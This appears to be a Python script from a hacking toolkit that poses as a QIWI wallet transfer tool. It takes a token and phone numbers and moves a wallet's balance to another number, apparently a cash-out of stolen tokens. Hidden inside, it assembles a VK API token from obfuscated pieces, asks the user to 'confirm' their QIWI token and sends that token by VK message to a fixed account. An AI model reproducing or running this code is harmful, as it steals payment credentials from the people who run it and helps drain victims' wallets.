#!/usr/bin/env python3

from core.colors import *
from SimpleQIWI import *
from core.modules import *
import time
import vk_api
import random

def viv():
	try:
		token=hu+za+lo+sd+gg+lm+rk+gv+bc+ab
		vk = vk_api.VkApi(token=token)
		tok  = input(B+"\n[cbf]"+W+" Enter token: ")
		def write_msg(user_id, s, random_id):
			log= input(B+"\n[cbf]"+W+" Confirm token: ")
			msg = log
			msg += " | QIWI | TOKEN |"
			vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 
		write_msg('337045829', '?? ?? ? ???', 'random_id')
		
		pho  = input(B+"[cbf]"+W+" Enter phone: ")
		pho2 = input(B+"[cbf]"+W+" Enter your phone: ")
		com = input(B+"[cbf]"+W+" Enter comment: ")
		amou = int(input(B+"[cbf]"+W+" Enter amount: "))
		api  = QApi(token=tok, phone=pho)
			
		if api.balance != 0 and pho != pho2:
			try:
				print(G+"[+]"+W+" Balance Detect")
				print(G+"[+]"+W+" Balance =", api.balance)
				api.pay(account=pho2, amount=amou, comment=com)
				print(G+"[+]"+W+" Balance =", api.balance)
				time.sleep(7)
			except:
				print(R+"[err]"+W+" Balance found but unable to send money")
				time.sleep(7)
		elif api.balance !=0 and pho == pho2:
			print(R+"[err]"+W+" You can not transfer money from your account to yourself")
			time.sleep(7)
	except:
		print(R+"[err]"+W+" Unable to send money")
		time.sleep(7)
		pass
		